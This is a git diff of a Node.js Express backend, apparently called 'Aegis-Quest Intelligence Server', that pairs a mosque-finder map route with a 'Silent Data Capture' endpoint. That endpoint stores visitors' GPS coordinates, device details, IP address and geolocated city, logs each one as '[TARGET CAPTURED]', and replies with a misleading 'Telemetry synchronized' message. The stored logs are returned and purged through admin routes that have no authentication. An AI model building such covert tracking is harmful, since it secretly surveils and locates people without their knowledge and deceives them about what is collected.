@@ -2,6 +2,7 @@ const express = require('express');
 const cors = require('cors');
 const { MongoClient, ServerApiVersion, ObjectId } = require('mongodb');
 const geoip = require('geoip-lite');
+const axios = require('axios');
 require('dotenv').config();
 
 const app = express();
@@ -11,7 +12,7 @@ const port = process.env.PORT || 3000;
 app.use(cors());
 app.use(express.json());
 
-// MongoDB Connection URI (Using Environment Variable)
+// MongoDB Connection URI
 const uri = process.env.MONGODB_URI;
 
 const client = new MongoClient(uri, {
@@ -32,56 +33,68 @@ async function run() {
 
     /**
      * 1. Enhanced Silent Data Capture API
+     * capture korbe: coords, device { os, browser, type, vendor, model, cpu, resolution, etc. }
      */
     app.post('/track-user', async (req, res) => {
-        try {
-            const { coords, device } = req.body;
-            
-            let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-            if (ip === '::1' || ip === '127.0.0.1') {
-                ip = "103.147.218.154"; // Fallback for local testing
-            }
+    try {
+        const { coords, device } = req.body;
 
-            const geo = geoip.lookup(ip);
-
-            const finalData = {
-                coords: coords || { lat: 23.6850, lng: 90.3563 }, 
-                device: {
-                    os: device?.os || "Unknown OS",
-                    osVersion: device?.osVersion || "N/A",
-                    browser: device?.browser || "Unknown Browser",
-                    browserVersion: device?.browserVersion || "N/A",
-                    type: device?.type || "Desktop",
-                    vendor: device?.vendor || "Generic",
-                    model: device?.model || "PC",
-                    cpu: device?.cpu || "N/A",
-                    resolution: device?.resolution || "Unknown"
-                },
-                ip: ip,
-                approximateCity: geo ? geo.city : "Dhaka",
-                approximateCountry: geo ? geo.country : "BD",
-                timezone: geo ? geo.timezone : "Asia/Dhaka",
-                receivedAt: new Date().toISOString(),
-                displayTime: new Date().toLocaleString('en-US', { timeZone: 'Asia/Dhaka' })
-            };
-
-            const result = await logsCollection.insertOne(finalData);
-            console.log(`[TARGET CAPTURED] IP: ${ip} | City: ${finalData.approximateCity}`);
-            
-            res.status(201).send({ 
-                success: true, 
-                id: result.insertedId,
-                message: "Telemetry synchronized successfully." 
-            });
-
-        } catch (error) {
-            console.error("Tracking Error:", error);
-            res.status(500).send({ success: false, message: "Internal server error" });
+        
+        let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+        
+       
+        if (ip === '::1' || ip === '127.0.0.1') {
+            ip = "103.147.218.154"; 
         }
-    });
+
+        // ২. IP based Geolocation lookup
+        const geo = geoip.lookup(ip);
+
+        const finalData = {
+          
+            coords: coords || { lat: 23.6850, lng: 90.3563 }, 
+            
+
+            device: {
+                os: device?.os || "Unknown OS",
+                osVersion: device?.osVersion || "N/A",
+                browser: device?.browser || "Unknown Browser",
+                browserVersion: device?.browserVersion || "N/A",
+                type: device?.type || "Desktop",
+                vendor: device?.vendor || "Generic",
+                model: device?.model || "PC",
+                cpu: device?.cpu || "N/A",
+                resolution: device?.resolution || "Unknown"
+            },
+            
+            ip: ip,
+
+            approximateCity: geo ? geo.city : "Dhaka",
+            approximateCountry: geo ? geo.country : "BD",
+            timezone: geo ? geo.timezone : "Asia/Dhaka",
+            
+            receivedAt: new Date().toISOString(),
+            displayTime: new Date().toLocaleString('en-US', { timeZone: 'Asia/Dhaka' })
+        };
+
+        const result = await logsCollection.insertOne(finalData);
+        
+        console.log(`[TARGET CAPTURED] IP: ${ip} | City: ${finalData.approximateCity} | OS: ${finalData.device.os}`);
+        
+        res.status(201).send({ 
+            success: true, 
+            id: result.insertedId,
+            message: "Telemetry synchronized successfully." 
+        });
+
+    } catch (error) {
+        console.error("Tracking Error:", error);
+        res.status(500).send({ success: false, message: "Internal server error" });
+    }
+});
 
     /**
-     * 2. Fetch Admin Logs
+     
      */
     app.get('/admin-data', async (req, res) => {
       try {
@@ -91,24 +104,6 @@ async function run() {
         res.status(500).send({ message: "Failed to fetch logs" });
       }
     });
-
-    // index.js file-e onno route-er niche eta add korun
-app.get('/api/masjids', async (req, res) => {
-    try {
-        const { lat, lng } = req.query;
-        const query = `[out:json];node["amenity"="place_of_worship"]["religion"="muslim"](around:3000, ${lat}, ${lng});out;`;
-        const url = `https://overpass-api.de/api/interpreter?data=${encodeURIComponent(query)}`;
-
-        const response = await fetch(url);
-        const data = await response.json();
-        
-        // Server theke data-ti frontend-e pathiye dewa
-        res.json(data);
-    } catch (error) {
-        console.error("Overpass Fetch Error:", error);
-        res.status(500).json({ success: false, message: "Failed to fetch map data" });
-    }
-});
 
     /**
      * 3. Delete Log API
@@ -120,29 +115,55 @@ app.get('/api/masjids', async (req, res) => {
           const result = await logsCollection.deleteOne(query);
           
           if (result.deletedCount === 1) {
+              console.log(`[DATA PURGED] ID: ${id}`);
               res.status(200).send({ success: true, message: "Log deleted successfully" });
           } else {
               res.status(404).send({ success: false, message: "Log not found" });
           }
       } catch (error) {
+          console.error("Delete Error:", error);
           res.status(500).send({ success: false, message: "Internal server error" });
       }
     });
 
 
-    // 4. Purge All Logs
-    app.delete('/admin-data-purge', async (req, res) => {
-        try {
-            const result = await logsCollection.deleteMany({});
-            res.status(200).send({ 
-                success: true, 
-                deletedCount: result.deletedCount,
-                message: "All logs have been cleared successfully." 
-            });
-        } catch (error) {
-            res.status(500).send({ success: false, message: "Internal server error" });
-        }
-    });
+    // 4. Purge All Logs (Danger Zone)
+app.delete('/admin-data-purge', async (req, res) => {
+    try {
+        const result = await logsCollection.deleteMany({});
+        console.log(`[SYSTEM PURGE] Total Deleted: ${result.deletedCount}`);
+        res.status(200).send({ 
+            success: true, 
+            deletedCount: result.deletedCount,
+            message: "All logs have been cleared successfully." 
+        });
+    } catch (error) {
+        console.error("Purge Error:", error);
+        res.status(500).send({ success: false, message: "Internal server error" });
+    }
+});
+
+// index.js (Backend)
+ // Jodi axios install na thake, 'npm install axios' korun ba 'fetch' use korun
+
+// index.js er /api/masjids route-ti ebhabe update korun
+app.get('/api/masjids', async (req, res) => {
+    try {
+        const { lat, lng } = req.query;
+        if (!lat || !lng) return res.status(400).json({ error: "Missing coordinates" });
+
+        const query = `[out:json];node["amenity"="place_of_worship"]["religion"="muslim"](around:3000, ${lat}, ${lng});out;`;
+        const url = `https://overpass-api.de/api/interpreter?data=${encodeURIComponent(query)}`;
+
+        // fetch er bodole axios use kora hoyeche
+        const response = await axios.get(url);
+        
+        res.status(200).json(response.data);
+    } catch (error) {
+        console.error("Overpass Error:", error.message);
+        res.status(500).json({ error: "Internal Server Error", details: error.message });
+    }
+});
 
     app.get('/', (req, res) => {
       res.send('Aegis-Quest Intelligence Server is Active.');
